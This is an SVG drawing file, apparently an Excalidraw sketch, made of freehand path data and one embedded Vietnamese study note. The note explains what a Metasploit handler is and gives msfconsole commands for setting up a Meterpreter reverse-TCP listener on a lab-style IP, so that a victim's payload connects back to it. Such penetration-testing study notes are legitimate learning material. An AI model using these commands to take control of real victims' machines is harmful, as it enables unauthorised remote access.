<path d="M900.39 4429.82 L900.33 4428.45 L900.56 4427.45 L901.00 4426.70 L901.68 4426.01 L902.74 4425.82 L903.42 4426.26 L903.81 4427.26 L903.64 4428.45 L903.25 4430.64 L902.46 4432.89 L901.29 4435.20 L899.71 4437.70 L897.97 4440.14 L896.40 4442.14 L894.94 4443.95 L893.93 4445.33 L892.98 4446.39 L892.42 4447.14 L892.42 4447.14" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M891.35 4454.02 L891.07 4454.83 L891.07 4454.83" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M926.38 4427.63 L926.49 4426.63 L926.72 4425.57 L926.94 4424.57 L928.12 4424.57 L928.63 4425.19 L929.07 4426.07 L929.92 4428.82 L929.97 4430.57 L929.75 4432.57 L929.13 4435.01 L928.23 4437.32 L927.73 4438.45 L926.44 4440.70 L924.86 4443.02 L922.06 4446.27 L920.37 4447.89 L919.14 4449.33 L919.14 4449.33" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M917.06 4458.02 L916.56 4458.77 L916.22 4459.59 L916.22 4459.59" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">

<rect x="1021.5341427451681" y="4241.271240234373" width="644.6977266378308" height="527.8462636847239" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
<foreignObject x="1021.5341427451681" y="4241.271240234373" width="644.6977266378308" height="527.8462636847239" class="excalidraw-foreign-md">
  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
    <div class="notion-embed-header">
      <div class="notion-embed-header-left">
        <span class="notion-embed-icon">📝</span>
        <span class="notion-embed-title">Ghi chú Markdown</span>
      </div>
      <a href="#doc-fb841c2d1f74b56a3a48fba62ddf7d11405d3693" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
    </div>
    <div class="notion-embed-body">
      <p>Handler là <strong>cái &quot;tổng đài&quot; mày mở trên máy mình để chờ nạn nhân gọi về</strong>.</p>
<p>Khi payload chạy trên máy nạn nhân, nó sẽ kết nối ngược về địa chỉ IP:port mà mày đã ghi trong payload (LHOST, LPORT). Lúc đó cần có một thằng đứng nghe ở cổng đó để bắt máy, tạo phiên (session) cho mày điều khiển. Thằng đó gọi là <strong>handler</strong>.</p>
<p>Trong Metasploit, handler là module <code>exploit/multi/handler</code>. Mày cấu hình nó khớp với payload đã tạo (cùng payload type, cùng LHOST, LPORT) rồi chạy nó để lắng nghe.</p>
<p>Ví dụ:</p>
<ol>
<li>Mày tạo file payload bằng <code>msfvenom</code> với <code>LHOST=10.10.14.12</code>, <code>LPORT=4444</code>.</li>
<li>Mở <code>msfconsole</code>, dùng:<pre><code>use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.12
set LPORT 4444
run
</code></pre>
</li>
<li>Khi nạn nhân chạy file payload, nó gọi về <code>10.10.14.12:4444</code>, handler bắt và mở session.</li>
</ol>
<p>Nếu payload là <strong>staged</strong>, handler còn phải gửi thêm stage cho nó tải về. Còn <strong>stageless</strong> thì chỉ cần nhận kết nối là xong.</p>
<p>Tóm lại: handler = thằng đứng đợi máy nạn nhân gọi về để mở cửa cho mày vào. Không có nó thì payload chạy cũng như gọi vào máy không ai bắt. 😎</p>

    </div>
  </div>
</foreignObject>

</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1041.80 4248.10 L1037.43 4247.73 L1032.93 4247.85 L1030.63 4248.10 L1026.42 4249.04 L1020.30 4251.73 L1016.77 4254.61 L1015.31 4256.23 L1012.89 4260.17 L1011.71 4264.23 L1011.32 4268.61 L1011.88 4273.18 L1013.45 4277.93 L1016.15 4282.30 L1020.42 4286.56 L1022.89 4288.24 L1028.67 4290.99 L1038.10 4293.06 L1044.84 4293.37 L1052.13 4292.50 L1059.77 4290.87 L1066.62 4288.50 L1072.91 4285.56 L1075.77 4283.93 L1080.88 4280.37 L1084.70 4276.74 L1087.67 4272.80 L1089.75 4268.42 L1090.65 4262.55 L1089.58 4258.73 L1088.29 4256.61 L1084.25 4252.85 L1078.18 4249.73 L1070.72 4247.91 L1062.13 4247.16 L1053.20 4247.91 L1042.37 4250.61 L1032.71 4254.17 L1032.71 4254.17" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1429.23 4484.46 L1428.50 4483.96 L1427.88 4483.39 L1427.21 4482.96 L1427.88 4483.58 L1429.23 4485.02 L1430.74 4486.52 L1432.32 4488.15 L1433.78 4489.90 L1435.12 4491.96 L1435.74 4493.02 L1436.64 4495.33 L1436.98 4497.96 L1436.92 4501.09 L1436.30 4504.84 L1435.24 4508.90 L1433.78 4513.59 L1431.36 4520.78 L1430.13 4524.72 L1429.62 4526.79 L1428.84 4530.48 L1428.61 4533.48 L1428.95 4536.23 L1429.85 4538.42 L1431.25 4540.17 L1433.16 4541.17 L1435.24 4541.73 L1436.30 4541.79 L1439.17 4541.29 L1441.36 4540.36 L1443.21 4539.17 L1444.78 4537.79 L1446.07 4536.35 L1446.97 4535.23 L1447.42 4534.35 L1447.14 4533.29 L1445.17 4534.35 L1443.49 4535.85 L1441.92 4537.67 L1440.57 4539.67 L1439.95 4540.79 L1438.89 4543.11 L1438.04 4545.55 L1437.43 4548.23 L1436.98 4550.98 L1436.64 4553.86 L1436.30 4556.86 L1436.08 4559.99 L1435.97 4562.93 L1435.97 4565.87 L1435.97 4568.74 L1436.02 4571.68 L1436.08 4574.37 L1436.08 4577.00 L1436.08 4578.31 L1435.97 4581.62 L1435.40 4584.44 L1434.51 4586.25 L1433.22 4587.88 L1431.70 4588.94 L1429.45 4589.44 L1427.88 4588.88 L1426.37 4587.19 L1425.80 4586.00 L1425.36 4583.19 L1425.36 4583.19" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1463.92 4527.10 L1462.86 4527.23 L1464.26 4527.23 L1465.44 4527.23 L1468.75 4527.23 L1471.11 4527.23 L1473.13 4527.16 L1474.87 4527.16 L1476.22 4527.10 L1477.45 4527.04 L1477.45 4527.04" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1473.30 4528.48 L1472.01 4528.66 L1470.94 4528.91 L1472.01 4528.98 L1474.14 4528.91 L1476.67 4528.60 L1479.42 4528.23 L1482.06 4527.85 L1483.24 4527.60 L1484.42 4527.41 L1484.42 4527.41" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1489.97 4516.10 L1489.24 4515.72 L1490.03 4516.41 L1490.70 4516.97 L1491.71 4518.41 L1492.11 4519.35 L1492.39 4521.03 L1492.22 4523.91 L1491.49 4526.48 L1490.25 4528.91 L1488.68 4531.79 L1486.83 4534.23 L1485.09 4536.35 L1483.40 4537.67 L1483.40 4537.67" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1518.77 4509.65 L1518.55 4508.59 L1518.27 4507.41 L1518.04 4506.53 L1517.76 4505.46 L1517.37 4504.59 L1516.92 4503.84 L1516.36 4503.28 L1515.80 4502.71 L1515.01 4502.28 L1514.51 4501.65 L1514.51 4501.65" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1521.41 4501.21 L1520.74 4500.78 L1520.68 4501.84 L1520.85 4504.03 L1520.85 4506.78 L1520.91 4509.84 L1520.96 4512.78 L1520.96 4514.22 L1520.96 4517.03 L1520.96 4519.72 L1520.96 4520.91 L1520.96 4522.85 L1520.96 4524.29 L1520.96 4525.54 L1520.96 4526.72 L1520.96 4526.72" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1527.64 4513.35 L1529.38 4512.53 L1530.11 4512.16 L1532.13 4510.78 L1532.75 4510.28 L1533.82 4508.90 L1534.72 4507.15 L1535.39 4505.22 L1535.73 4503.03 L1535.84 4501.96 L1535.84 4500.34 L1535.84 4498.96 L1535.78 4497.90 L1535.73 4496.77 L1534.32 4499.09 L1533.65 4501.52 L1533.37 4502.90 L1532.75 4505.71 L1532.47 4508.72 L1532.13 4511.72 L1531.80 4514.72 L1531.46 4519.10 L1531.40 4520.47 L1531.35 4522.97 L1531.35 4524.72 L1531.40 4526.16 L1531.40 4526.16" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1544.15 4512.66 L1543.25 4512.28 L1542.13 4512.28 L1540.89 4512.59 L1539.38 4513.66 L1538.65 4514.22 L1537.30 4515.47 L1536.74 4516.16 L1535.95 4517.28 L1535.45 4518.47 L1535.22 4519.47 L1535.17 4520.66 L1535.45 4521.60 L1536.18 4522.10 L1537.13 4521.91 L1538.65 4520.47 L1539.15 4519.47 L1540.16 4517.54 L1541.00 4515.47 L1541.45 4514.47 L1541.96 4513.03 L1542.41 4512.03 L1542.74 4511.16 L1543.03 4510.34 L1542.86 4511.53 L1542.80 4512.59 L1542.86 4513.66 L1543.03 4514.78 L1543.19 4515.78 L1543.47 4516.66 L1544.60 4516.53 L1545.16 4515.78 L1545.66 4514.84 L1546.17 4513.97 L1546.62 4513.16 L1547.18 4512.28 L1547.85 4512.78 L1548.08 4513.84 L1548.25 4514.78 L1548.53 4515.66 L1548.98 4516.59 L1549.65 4517.16 L1550.66 4516.84 L1551.33 4516.41 L1551.95 4515.78 L1552.63 4515.10 L1553.19 4514.41 L1553.80 4515.10 L1554.03 4516.03 L1554.03 4516.03" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1565.37 4512.47 L1564.53 4511.72 L1563.52 4511.34 L1562.34 4511.34 L1559.70 4512.41 L1558.02 4513.35 L1556.61 4514.59 L1555.99 4515.16 L1555.15 4516.28 L1554.65 4517.35 L1554.42 4518.28 L1554.42 4519.41 L1554.82 4520.16 L1555.60 4520.47 L1557.51 4519.91 L1559.92 4518.35 L1562.79 4515.66 L1565.65 4511.84 L1568.23 4507.34 L1570.48 4502.40 L1571.49 4499.96 L1573.12 4495.27 L1574.35 4491.34 L1575.14 4488.15 L1575.98 4484.71 L1576.32 4483.02 L1576.54 4481.89 L1576.37 4480.83 L1575.76 4481.39 L1574.86 4483.33 L1574.41 4484.58 L1573.51 4487.64 L1572.67 4491.34 L1571.94 4495.21 L1571.38 4499.03 L1570.93 4504.53 L1570.87 4506.22 L1570.82 4509.47 L1570.87 4512.41 L1571.10 4515.03 L1571.38 4517.16 L1571.77 4518.66 L1572.27 4519.47 L1573.29 4519.91 L1575.76 4517.97 L1577.10 4516.16 L1577.83 4515.10 L1578.96 4513.22 L1580.02 4511.34 L1580.81 4509.72 L1581.26 4508.47 L1581.48 4507.53 L1581.43 4506.40 L1580.81 4505.59 L1579.74 4505.34 L1578.96 4505.65 L1577.89 4506.90 L1576.65 4508.53 L1575.70 4510.41 L1574.91 4512.41 L1574.41 4514.41 L1574.13 4516.10 L1574.18 4518.72 L1574.41 4519.72 L1574.80 4520.47 L1575.31 4521.03 L1576.20 4521.41 L1578.96 4520.53 L1580.81 4519.03 L1582.77 4517.03 L1583.62 4516.03 L1585.19 4514.03 L1586.65 4512.22 L1587.83 4510.59 L1588.61 4509.47 L1589.23 4508.59 L1589.51 4507.72 L1588.67 4508.15 L1588.22 4508.90 L1587.94 4509.72 L1587.77 4511.03 L1587.99 4512.03 L1588.27 4512.97 L1589.45 4515.41 L1590.02 4516.66 L1590.63 4517.91 L1591.14 4518.78 L1591.76 4519.60 L1592.82 4520.91 L1593.72 4521.35 L1594.73 4521.54 L1594.73 4521.54" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1720.71 4504.97 L1719.92 4505.34 L1716.95 4506.65 L1713.69 4507.78 L1711.84 4508.41 L1707.35 4509.72 L1702.24 4511.28 L1696.91 4512.66 L1691.35 4513.97 L1685.73 4515.16 L1682.76 4515.66 L1673.78 4516.78 L1667.88 4517.22 L1662.32 4517.59 L1657.10 4517.72 L1651.99 4517.91 L1649.47 4517.91 L1644.53 4518.03 L1639.76 4517.97 L1635.21 4517.78 L1631.00 4517.66 L1627.07 4517.59 L1625.44 4517.54 L1620.61 4517.41 L1617.80 4517.54 L1616.51 4517.41 L1614.49 4517.41 L1612.75 4517.41 L1611.29 4517.35 L1610.17 4517.28 L1608.77 4517.28 L1607.70 4517.22 L1606.63 4517.03 L1606.63 4517.03" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1628.42 4503.28 L1627.63 4502.71 L1625.50 4503.40 L1623.03 4504.22 L1620.22 4505.34 L1617.36 4506.72 L1614.60 4508.22 L1612.13 4509.90 L1609.89 4511.65 L1607.98 4513.35 L1607.14 4514.35 L1605.90 4516.16 L1604.95 4517.97 L1604.67 4519.60 L1605.17 4521.29 L1606.69 4523.04 L1609.55 4524.72 L1613.26 4526.29 L1617.30 4527.60 L1621.34 4528.66 L1625.50 4529.48 L1625.50 4529.48" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1691.12 4530.73 L1690.45 4529.79 L1689.66 4529.23 L1688.65 4528.98 L1687.53 4529.10 L1686.91 4529.66 L1686.97 4530.79 L1687.92 4532.60 L1688.93 4534.23 L1689.55 4535.04 L1690.62 4536.67 L1691.52 4538.17 L1692.13 4539.48 L1692.53 4540.61 L1692.64 4541.67 L1692.53 4542.98 L1692.13 4544.11 L1691.52 4544.98 L1690.90 4545.67 L1690.17 4546.05 L1689.16 4546.30 L1689.38 4545.36 L1691.24 4543.86 L1693.03 4542.42 L1695.00 4540.98 L1697.02 4539.48 L1698.98 4537.85 L1700.78 4536.29 L1701.73 4535.48 L1703.76 4533.29 L1704.82 4531.60 L1705.16 4530.85 L1705.72 4529.60 L1706.00 4528.48 L1706.11 4527.16 L1705.38 4526.41 L1704.49 4526.66 L1703.47 4527.41 L1701.96 4528.85 L1700.67 4530.54 L1699.60 4532.54 L1698.93 4534.54 L1698.70 4535.61 L1698.48 4537.42 L1698.59 4538.92 L1698.87 4540.23 L1699.21 4541.36 L1699.60 4542.36 L1700.05 4543.11 L1700.67 4544.04 L1700.67 4544.04" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1718.91 4528.23 L1716.11 4527.54 L1714.37 4527.48 L1712.12 4527.72 L1710.21 4528.10 L1709.43 4528.35 L1708.13 4529.04 L1707.35 4529.79 L1707.12 4531.10 L1707.57 4532.29 L1708.64 4534.10 L1709.87 4535.79 L1711.05 4537.36 L1712.12 4538.92 L1712.96 4540.23 L1713.58 4541.36 L1713.92 4542.23 L1714.14 4543.55 L1714.14 4544.67 L1713.86 4545.67 L1713.36 4546.42 L1712.63 4546.92 L1711.67 4546.61 L1712.63 4544.98 L1713.92 4543.36 L1713.92 4543.36" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1727.45 4532.60 L1726.44 4532.29 L1724.42 4533.48 L1722.79 4534.79 L1721.10 4536.29 L1719.92 4537.98 L1718.91 4539.79 L1718.52 4540.54 L1718.24 4541.86 L1718.18 4543.11 L1718.41 4544.04 L1718.69 4545.04 L1719.14 4545.79 L1719.53 4546.55 L1719.98 4547.55 L1720.37 4548.42 L1720.65 4549.30 L1720.82 4550.55 L1720.60 4551.55 L1719.98 4552.68 L1719.42 4553.36 L1718.63 4554.42 L1717.85 4555.24 L1717.23 4555.74 L1716.72 4555.17 L1717.51 4553.86 L1717.51 4553.86" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1730.76 4541.67 L1730.14 4542.55 L1729.64 4543.29 L1728.96 4544.55 L1728.57 4545.30 L1728.06 4546.48 L1727.67 4547.48 L1727.50 4548.61 L1727.50 4548.61" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1737.38 4540.36 L1736.60 4540.98 L1735.98 4541.55 L1734.69 4543.17 L1733.45 4545.11 L1732.44 4547.23 L1732.11 4548.30 L1731.60 4550.30 L1731.38 4551.92 L1731.43 4553.17 L1731.66 4554.49 L1732.44 4555.05 L1733.34 4554.49 L1734.52 4552.42 L1734.91 4551.24 L1735.59 4548.74 L1736.20 4546.42 L1736.65 4544.42 L1737.05 4542.98 L1737.33 4541.98 L1737.95 4541.17 L1738.84 4541.55 L1739.29 4542.36 L1739.74 4543.17 L1740.02 4544.04 L1740.36 4544.98 L1740.64 4545.92 L1741.03 4546.74 L1741.93 4546.42 L1743.39 4545.11 L1744.06 4544.36 L1745.47 4542.98 L1746.14 4542.42 L1747.21 4541.55 L1748.27 4541.29 L1748.67 4542.36 L1748.50 4543.29 L1748.05 4545.36 L1747.38 4547.61 L1746.76 4549.86 L1746.48 4550.86 L1746.09 4552.42 L1746.03 4553.49 L1746.03 4553.49" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1714.48 4433.68 L1714.09 4436.25 L1713.86 4437.69 L1713.64 4439.31 L1713.19 4442.75 L1712.51 4448.44 L1712.40 4450.06 L1712.12 4453.38 L1711.95 4456.51 L1711.95 4458.88 L1711.90 4460.70 L1711.90 4462.07 L1712.06 4463.07 L1712.40 4462.14 L1712.91 4457.76 L1712.96 4455.76 L1713.19 4451.32 L1713.41 4446.82 L1713.69 4442.69 L1714.25 4439.12 L1714.82 4436.12 L1715.66 4433.56 L1716.11 4432.37 L1717.17 4430.31 L1718.24 4428.81 L1719.14 4427.99 L1719.92 4427.62 L1720.88 4427.99 L1721.38 4428.87 L1721.61 4429.93 L1721.61 4431.37 L1721.16 4433.12 L1720.26 4434.87 L1718.97 4436.44 L1718.18 4436.81 L1718.18 4436.81" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1731.99 4429.93 L1731.43 4429.31 L1730.31 4429.18 L1728.74 4430.56 L1727.50 4432.18 L1726.60 4434.18 L1725.87 4436.12 L1725.48 4437.81 L1725.43 4439.06 L1725.54 4440.37 L1726.32 4440.88 L1727.95 4439.81 L1729.24 4438.25 L1730.25 4436.37 L1730.98 4434.31 L1731.43 4432.81 L1731.66 4431.68 L1731.88 4430.56 L1731.38 4431.31 L1731.21 4432.50 L1731.15 4433.87 L1731.21 4435.06 L1731.60 4436.06 L1732.27 4436.56 L1734.41 4436.00 L1735.98 4434.87 L1737.33 4433.50 L1737.95 4432.87 L1738.84 4431.99 L1739.52 4431.31 L1740.19 4430.68 L1741.09 4431.06 L1741.20 4432.12 L1741.03 4433.25 L1740.86 4434.50 L1740.19 4438.25 L1739.57 4441.19 L1738.79 4444.19 L1738.00 4447.31 L1737.50 4450.13 L1737.27 4451.50 L1736.82 4454.07 L1736.49 4456.19 L1736.20 4457.82 L1735.98 4459.07 L1735.76 4460.01 L1735.36 4461.07 L1734.63 4461.63 L1733.34 4461.38 L1731.88 4460.19 L1731.21 4459.44 L1730.14 4457.69 L1729.58 4455.94 L1729.58 4454.32 L1729.58 4454.32" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1757.54 4419.55 L1756.81 4419.99 L1755.69 4422.24 L1754.67 4424.74 L1754.23 4426.18 L1752.71 4431.12 L1751.76 4434.69 L1750.86 4438.06 L1750.07 4440.94 L1749.57 4443.50 L1749.40 4444.50 L1749.34 4446.19 L1749.45 4447.13 L1750.24 4447.69 L1750.24 4447.69" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1757.99 4438.94 L1757.26 4439.50 L1756.58 4440.44 L1755.46 4443.12 L1755.12 4444.12 L1754.90 4445.19 L1754.79 4447.00 L1754.84 4448.44 L1755.01 4449.63 L1755.29 4450.50 L1755.74 4451.57 L1756.42 4452.19 L1756.86 4451.44 L1757.03 4450.38 L1757.26 4448.06 L1757.31 4447.00 L1757.48 4445.25 L1757.65 4443.81 L1757.99 4442.75 L1758.44 4441.94 L1759.05 4441.44 L1760.06 4441.12 L1761.19 4441.19 L1762.14 4441.63 L1762.76 4442.31 L1763.04 4443.19 L1762.93 4444.25 L1762.59 4445.19 L1762.25 4446.06 L1761.86 4447.00 L1761.47 4447.88 L1761.19 4448.82 L1760.96 4449.69 L1761.24 4450.63 L1762.25 4450.44 L1762.76 4449.88 L1763.15 4449.13 L1762.59 4449.75 L1762.59 4449.75" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1768.88 4451.06 L1768.26 4449.75 L1766.30 4449.69 L1764.95 4451.06 L1763.83 4452.44 L1762.98 4453.94 L1762.53 4455.25 L1762.31 4456.32 L1762.25 4457.44 L1762.76 4458.32 L1764.33 4457.26 L1765.57 4455.57 L1765.57 4455.57" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1770.39 4442.31 L1768.88 4443.38 L1767.76 4447.00 L1767.42 4448.75 L1767.36 4451.01 L1767.36 4453.25 L1767.36 4453.25" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1686.24 4398.04 L1685.06 4398.42 L1683.32 4402.92 L1681.69 4407.98 L1680.91 4410.92 L1679.17 4417.93 L1677.65 4425.43 L1676.36 4433.50 L1675.52 4441.44 L1675.01 4448.94 L1674.84 4452.44 L1674.79 4459.13 L1675.01 4468.32 L1675.35 4473.26 L1675.85 4477.64 L1676.19 4481.14 L1676.53 4482.64 L1677.03 4485.33 L1677.43 4487.33 L1677.76 4488.77 L1678.10 4489.83 L1678.72 4490.52 L1679.95 4490.21 L1680.68 4489.58 L1680.68 4489.58" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1684.33 4385.98 L1686.30 4384.10 L1689.55 4382.60 L1694.55 4381.60 L1700.89 4381.41 L1704.37 4381.66 L1712.96 4382.66 L1723.07 4384.41 L1730.82 4386.10 L1738.23 4387.91 L1744.63 4389.66 L1747.49 4390.48 L1753.05 4392.10 L1758.10 4393.42 L1764.22 4395.04 L1767.87 4395.85 L1769.55 4396.29 L1772.36 4396.98 L1774.83 4397.73 L1777.07 4398.54 L1778.98 4399.48 L1780.72 4400.42 L1781.90 4401.30 L1783.31 4402.23 L1784.54 4403.17 L1785.78 4404.17 L1786.67 4405.36 L1787.18 4406.74 L1787.74 4408.36 L1787.74 4408.36" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1681.86 4487.71 L1682.14 4489.21 L1682.76 4490.15 L1684.89 4491.96 L1688.20 4493.65 L1690.39 4494.52 L1698.14 4496.65 L1703.98 4497.77 L1710.83 4498.65 L1718.07 4499.34 L1724.81 4499.84 L1728.12 4500.03 L1734.24 4500.34 L1739.74 4500.52 L1744.51 4500.59 L1748.95 4500.52 L1752.60 4500.46 L1755.97 4500.21 L1759.05 4499.84 L1759.05 4499.84" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1757.65 4506.22 L1759.28 4504.09 L1759.95 4503.09 L1761.47 4500.34 L1763.38 4496.65 L1764.44 4494.46 L1766.52 4489.52 L1768.54 4483.64 L1770.73 4477.14 L1772.81 4471.14 L1774.60 4465.82 L1775.50 4463.38 L1777.24 4458.63 L1778.70 4454.32 L1780.78 4448.19 L1782.13 4444.19 L1782.91 4442.25 L1784.26 4438.62 L1785.38 4435.43 L1786.28 4432.94 L1787.12 4430.75 L1787.91 4428.93 L1788.58 4427.05 L1789.09 4425.37 L1789.37 4423.62 L1789.37 4423.62" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1699.15 4309.32 L1697.80 4311.57 L1697.02 4313.13 L1695.73 4316.57 L1694.60 4320.45 L1693.65 4324.14 L1692.81 4327.76 L1692.58 4329.26 L1691.74 4333.39 L1691.29 4335.83 L1691.07 4337.52 L1690.90 4338.89 L1690.84 4340.21 L1690.84 4340.21" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1689.78 4313.95 L1689.72 4312.88 L1690.11 4311.69 L1691.07 4310.69 L1692.98 4309.57 L1695.62 4308.44 L1696.96 4308.01 L1699.99 4307.25 L1703.19 4306.82 L1706.39 4306.69 L1709.43 4307.13 L1710.83 4307.44 L1710.83 4307.44" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1721.33 4324.51 L1719.36 4325.32 L1718.46 4325.82 L1717.57 4326.32 L1715.66 4327.51 L1713.86 4328.89 L1712.12 4330.39 L1711.39 4331.20 L1709.31 4333.64 L1708.19 4335.14 L1707.74 4335.83 L1707.29 4337.02 L1707.01 4337.89 L1707.07 4339.08 L1707.91 4339.33 L1709.48 4338.39 L1710.10 4337.64 L1711.73 4335.08 L1712.74 4333.33 L1713.13 4332.58 L1713.69 4331.39 L1714.09 4330.45 L1714.53 4329.58 L1714.09 4330.39 L1713.92 4331.39 L1714.14 4332.51 L1714.14 4332.51" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1728.74 4330.32 L1727.39 4329.01 L1725.99 4328.01 L1724.64 4327.51 L1723.35 4327.26 L1722.23 4327.45 L1720.37 4328.32 L1719.64 4328.83 L1718.52 4329.64 L1717.85 4330.51 L1717.57 4331.39 L1717.73 4332.64 L1718.46 4333.33 L1719.36 4333.70 L1720.71 4333.77 L1721.72 4333.45 L1722.56 4333.08 L1723.35 4332.64 L1724.19 4332.26 L1725.26 4332.51 L1725.43 4333.83 L1725.48 4337.45 L1725.43 4340.08 L1725.31 4342.21 L1725.31 4343.96 L1725.26 4345.39 L1725.20 4346.58 L1725.09 4347.96 L1724.98 4349.02 L1724.58 4349.90 L1723.74 4350.27 L1722.67 4350.15 L1722.23 4349.46 L1722.67 4348.77 L1724.02 4347.52 L1725.43 4346.21 L1726.83 4344.96 L1727.62 4344.33 L1729.64 4342.64 L1730.76 4341.64 L1732.05 4340.33 L1733.23 4339.08 L1734.24 4338.08 L1734.86 4337.39 L1735.53 4336.77 L1736.43 4335.64 L1737.27 4334.77 L1737.83 4333.95 L1738.39 4333.14 L1738.90 4332.20 L1739.24 4331.39 L1739.52 4330.45 L1739.74 4329.32 L1739.57 4328.32 L1738.79 4327.95 L1737.83 4328.20 L1735.98 4329.70 L1735.42 4330.39 L1734.30 4331.89 L1733.45 4333.51 L1733.17 4334.39 L1732.78 4335.83 L1732.78 4338.27 L1733.85 4340.58 L1734.97 4342.08 L1736.37 4343.21 L1737.95 4344.08 L1739.35 4344.58 L1740.70 4344.71 L1743.17 4344.27 L1743.17 4344.27" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1757.43 4325.70 L1756.58 4326.45 L1755.80 4327.83 L1754.84 4329.83 L1754.00 4332.33 L1753.33 4334.89 L1753.10 4336.26 L1752.82 4338.89 L1752.65 4341.39 L1752.71 4342.46 L1752.71 4344.21 L1752.88 4345.52 L1752.93 4347.02 L1752.93 4347.02" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1753.33 4339.58 L1754.45 4339.58 L1755.69 4339.83 L1756.81 4340.08 L1756.81 4340.08" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
